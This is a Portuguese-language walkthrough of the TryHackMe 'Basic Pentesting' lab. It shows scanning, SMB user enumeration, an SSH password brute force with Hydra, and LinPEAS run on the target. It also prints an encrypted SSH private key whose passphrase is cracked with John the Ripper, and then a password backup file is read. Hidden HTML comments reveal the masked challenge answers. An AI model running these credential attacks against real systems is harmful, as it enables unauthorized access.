---
title: "TryHackMe: Basic Pentesting"
description: Esta máquina permite praticar hacking de aplicações web e escalada de privilégios.
author: c3n0r4
categories: [Challenges, Linux]
tags: [CTF-Fácil, nmap, gobuster, enum4linux, hydra, linpeas, privilege-escalation, john-the-ripper]
media_subpath: /assets/images/basicpentesting
image:
  path: capa.webp
comments: true
---

## Reconhecimento
### Varredura de porta e Detecção de serviço
O reconhecimento inicial foi realizado com o `Nmap`, escaneando todas as portas TCP e executando scripts de detecção de versão e serviços:

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ nmap -p- -sC -sV -n -Pn -T4 10.10.78.224                                                                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-15 15:57 -03
Nmap scan report for 10.10.78.224
Host is up (0.21s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2025-03-15T15:06:40-04:00
| smb2-time: 
|   date: 2025-03-15T19:06:40
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 573.41 seconds
```

## Enumeração
### Web
Utilizei o `Gobuster` para identificar diretórios ocultos no servidor web, em busca da primeira resposta do desafio. <!--development -->

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ gobuster dir -u http://10.10.78.224 -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q             
http://10.10.78.224/THM{***********}          (Status: 301) [Size: 318] [--> http://10.10.78.224/THM{***********}/]
```

![](index-of.webp)

### SMB
Para enumerar possíveis informações sobre usuários, domínio, compartilhamentos e políticas de senha, utilizei o `enum4linux`

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ enum4linux -a 10.10.78.224 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar 15 16:17:41 2025

 =========================================( Target Information )=========================================

[... saída longa omitida ...]

 ==================( Users on 10.10.78.224 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:            
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\THM{***} (Local User)                                                                                                              
S-1-22-1-1001 Unix User\THM{***} (Local User)

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''

S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)                                                
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                         
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 10.10.78.224 )===============================


No printers returned.


enum4linux complete on Tue May 27 16:33:33 2025
```

Usuários descobertos:
- `S-1-22-1-1000 Unix User\THM{***} (Local User)` <!-- kay -->
- `S-1-22-1-1001 Unix User\THM{***} (Local User)` <!-- jan -->

## Brute Force
Com os usuários identificados, realizei um ataque de força bruta com o `Hydra`, e uma das senhas foi descoberta com sucesso.  <!-- armando -->

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ hydra -l THM{***} -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.78.224

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these THM{***} ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-15 16:47:24
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.78.224:22/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 14344319 to do in 2988:24h, 4 active
[STATUS] 81.33 tries/min, 244 tries in 00:03h, 14344155 to do in 2939:23h, 4 active
[STATUS] 82.14 tries/min, 575 tries in 00:07h, 14343824 to do in 2910:21h, 4 active
[22][ssh] host: 10.10.78.224   login: THM{***}   password: THM{*******}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-15 16:57:13
```

## Exploração
### Acesso inicial
Com as credenciais válidas, foi possível obter acesso à máquina via `SSH` <!-- SSH -->

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ ssh THM{***}@10.10.78.224          
The authenticity of host '10.10.78.224 (10.10.78.224)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.78.224' (ED25519) to the list of known hosts.
THM{***}@10.10.78.224's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
THM{***}@basic2:~$
```

### Enumeração local
Realizei o download do script `linpeas.sh` e o transferi para a máquina alvo, com o intuito de automatizar a enumeração de possíveis vetores de escalada de privilégios.

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh         
--2025-03-15 19:53:31--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 20.201.28.151
Connecting to github.com (github.com)|20.201.28.151|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/peass-ng/PEASS-ng/releases/download/20250526-98e59520/linpeas.sh [following]
--2025-03-15 19:53:31--  https://github.com/peass-ng/PEASS-ng/releases/download/20250526-98e59520/linpeas.sh
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/5f6414c9-1eb9-40ac-aee8-f734d30565fe?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250527%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250527T225331Z&X-Amz-Expires=300&X-Amz-Signature=348d5f05e04328e28cd4d69ffff6a41fd15ae5d8bbd4d1d4b4a3894157d4bccd&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-03-15 19:53:31--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/5f6414c9-1eb9-40ac-aee8-f734d30565fe?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250527%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250527T225331Z&X-Amz-Expires=300&X-Amz-Signature=348d5f05e04328e28cd4d69ffff6a41fd15ae5d8bbd4d1d4b4a3894157d4bccd&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                       100%[==========================================================================================================>] 932.07K  3.72MB/s    in 0.2s    

2025-03-15 19:53:32 (3.72 MB/s) - ‘linpeas.sh’ saved [954437/954437]

┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ ll
total 944
-rw-rw-r-- 1 c3n0r4 c3n0r4 954437 Mar 15 19:15 linpeas.sh

┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ scp linpeas.sh ssh@10.10.78.224:/dev/shm/ 
ssh@10.10.78.224's password: 
linpeas.sh 

THM{***}@basic2:~$ cd /dev/shm/

THM{***}@basic2:/dev/shm$ ls -larth
total 936K
drwxr-xr-x 17 root root 3.7K Mar 15 13:59 ..
-rw-rw-r--  1 THM{***}  THM{***}  933K Mar 15 18:55 linpeas.sh
drwxrwxrwt  2 root root   60 Mar 15 18:55 .

THM{***}@basic2:/dev/shm$ chmod +x linpeas.sh 

THM{***}@basic2:/dev/shm$ ls -larth
total 936K
drwxr-xr-x 17 root root 3.7K Mar 15 13:59 ..
-rwxrwxr-x  1 THM{***}  THM{***}  933K Mar 15 18:55 linpeas.sh
drwxrwxrwt  2 root root   60 Mar 15 18:55 .

THM{***}@basic2:/dev/shm$ ./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|                                                                                                             
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                                                                                             
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                             
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                             
    |---------------------------------------------------------------------------------|                                                                                                             
    |                                 Thank you!                                      |                                                                                                             
    \---------------------------------------------------------------------------------/                                                                                                             
          LinPEAS-ng by carlospolop                                                                                                                                                                 
                                                                                                                                                                                                    
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                              
                                                                                                                                                                                                    
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                                                            
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...

[... saída longa omitida ...]

-rw-r--r-- 1 THM{***} THM{***} 3326 Apr 19  2018 /home/THM{***}/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
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
-----END RSA PRIVATE KEY-----

[... saída longa omitida ...]

Regexes to search for API keys aren't activated, use param '-r'
```
Durante a análise, foi encontrado um arquivo de chave privada SSH em `/home/***/.ssh/id_rsa`,pertencente ao outro usuário: <!-- kay -->

## Pós-Exploração
### PrivEsc

A chave privada foi copiada e salva localmente como id_rsa, com permissões apropriadas, uma tentativa de login foi realizada sem sucesso pois a chave estava protegida por uma `passphrase`.

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ vi id_rsa

┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ chmod 600 id_rsa  

┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ ssh -i id_rsa THM{***}@10.10.78.224
The authenticity of host '10.10.78.224 (10.10.78.224)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.78.224' (ED25519) to the list of known hosts.
Load key "id_rsa": error in libcrypto
THM{***}@10.10.78.224's password: 
```

Para quebrar `passphrase`, a chave foi convertida  para um formato compatível com o `John The Ripper` usando `ssh2john`. Em seguida, executamos o `John the Ripper` com a `wordlist rockyou` para realizar a quebra por `brute force`. Após alguns minutos, a passphrase foi descoberta com sucesso:  <!-- beeswax -->

```
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ ssh2john id_rsa > ssh2john.txt 

┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ john ssh2john.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
THM{******}          (id_rsa)     
1g 0:00:00:00 DONE (2025-05-27 20:11) 1.052g/s 87107p/s 87107c/s 87107C/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Movimentação Lateral
Com a `passphrase` da chave em mãos, estabeleci uma conexão `SSH`. Ao explorar o diretório `home`, listei os arquivos ocultos e um deles chamou minha atenção: `pass.bak`, que possuía permissões restritas.

 ```
┌──(c3n0r4㉿kali)-[~/tryhackme/room/basicpentesting]
└─$ ssh -i id_rsa THM{***}@10.10.78.224
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
THM{***}@basic2:~$ 
THM{***}@basic2:~$ ls -larth
total 48K
-rw-r--r-- 1 THM{***}  THM{***}   655 Apr 17  2018 .profile
-rw-r--r-- 1 THM{***}  THM{***}  3.7K Apr 17  2018 .bashrc
-rw-r--r-- 1 THM{***}  THM{***}   220 Apr 17  2018 .bash_logout
drwx------ 2 THM{***}  THM{***}  4.0K Apr 17  2018 .cache
-rw-r--r-- 1 THM{***}  THM{***}     0 Apr 17  2018 .sudo_as_admin_successful
drwxr-xr-x 4 root root 4.0K Apr 19  2018 ..
drwxrwxr-x 2 THM{***}  THM{***}  4.0K Apr 23  2018 .nano
drwxr-xr-x 2 THM{***}  THM{***}  4.0K Apr 23  2018 .ssh
-rw------- 1 THM{***}  THM{***}    57 Apr 23  2018 pass.bak
-rw------- 1 root THM{***}   538 Apr 23  2018 .viminfo
-rw------- 1 root THM{***}   119 Apr 23  2018 .lesshst
drwxr-xr-x 5 THM{***}  THM{***}  4.0K Apr 23  2018 .
-rw------- 1 THM{***}  THM{***}   756 Apr 23  2018 .bash_history
THM{***}@basic2:~$ cat pass.bak 
 ```

Ao visualizar seu conteúdo, encontrei a string final do desafio. <!-- heresareallystrongpasswordthatfollowsthepasswordpolicy$$ -->
